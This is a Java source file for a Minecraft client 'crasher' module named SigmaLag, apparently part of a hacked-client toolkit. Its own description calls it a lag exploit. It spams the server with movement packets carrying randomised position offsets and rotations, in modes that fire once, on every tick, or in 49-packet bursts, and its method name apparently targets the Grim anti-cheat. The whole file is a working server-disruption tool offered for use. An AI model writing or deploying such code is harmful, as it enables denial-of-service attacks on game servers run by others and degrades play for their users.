package us.whitedev.crashers.impl;

import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.MessageHelper;
import us.whitedev.helpers.BypassHelper;
import us.whitedev.utils.OptionUtil;
import us.whitedev.utils.OptionType;
import net.minecraft.client.Minecraft;
import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class SigmaLag extends Crasher {
    private final Minecraft mc = Minecraft.getInstance();
    private boolean enabled = false;
    private String mode = "Overlay";
    private int delta = 10;
    private int packets = 5;
    private int ticks = 0;
    public static boolean isSending = false;
    static Random random = new Random();

    public SigmaLag() {
        super();
    }

    @Override
    public String getName() {
        return "SigmaLag";
    }

    @Override
    public String getDescription() {
        return "Movement packet spam - Lag exploit";
    }

    @Override
    public String getArgsUsage() {
        return "<mode> <delta> <packets>";
    }

    @Override
    public List<OptionUtil> getOptions() {
        List<OptionUtil> options = new ArrayList<>();
        options.add(new OptionUtil("Mode", OptionType.LIST, new String[]{"Override", "Overlay", "OnActivate", "Sigma"}));
        options.add(new OptionUtil("Delta", OptionType.INTEGER, new String[]{"10"}));
        options.add(new OptionUtil("Packets", OptionType.INTEGER, new String[]{"5"}));
        return options;
    }

    @Override
    public void applyOptions(String[] values) {
        if (values.length > 0) this.mode = values[0];
        if (values.length > 1) {
            try { this.delta = Integer.parseInt(values[1]); } catch (Exception ignored) {}
        }
        if (values.length > 2) {
            try { this.packets = Integer.parseInt(values[2]); } catch (Exception ignored) {}
        }
    }

    @Override
    public void onMethod(String[] args) {
        if (mc.player == null || mc.getConnection() == null) {
            msgHelper.sendMessage("&cNot connected!", true);
            return;
        }

        if (mode.equals("OnActivate")) {
            sendGrimPackets(packets, delta);
        } else if (mode.equals("Overlay")) {
            // سيتم التفعيل في onTick
            setEnabled(true);
            msgHelper.sendMessage("&aSigmaLag enabled in Overlay mode", true);
        } else if (mode.equals("Sigma")) {
            setEnabled(true);
            msgHelper.sendMessage("&aSigmaLag enabled in Sigma mode", true);
        }
    }

    public void onTick() {
        if (!enabled) return;

        if (mode.equals("Overlay")) {
            if (mc.player == null || mc.getConnection() == null) return;
            sendGrimPackets(packets, delta);
        } else if (mode.equals("Sigma")) {
            ticks++;
            if (ticks > 60) {
                sendGrimPackets(49, delta);
                ticks = 0;
            }
        }
    }

    private void sendGrimPackets(int packets, int delta) {
        double baseX = mc.player.getX();
        double baseY = mc.player.getY();
        double baseZ = mc.player.getZ();
        isSending = true;
        try {
            for (int i = 0; i < packets; i++) {
                double offsetX = delta;
                double offsetY = delta;
                double offsetZ = delta;

                if (random.nextBoolean()) offsetX = -offsetX;
                if (random.nextBoolean()) offsetY = -offsetY;
                if (random.nextBoolean()) offsetZ = -offsetZ;

                ServerboundMovePlayerPacket.PosRot packet = new ServerboundMovePlayerPacket.PosRot(
                    baseX + offsetX,
                    baseY + offsetY,
                    baseZ + offsetZ,
                    mc.player.getYRot() + random.nextFloat() * 2 - 1,
                    mc.player.getXRot() + random.nextFloat() * 2 - 1,
                    random.nextBoolean()
                );

                mc.getConnection().send(packet);
            }
        } finally {
            isSending = false;
        }
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }
}
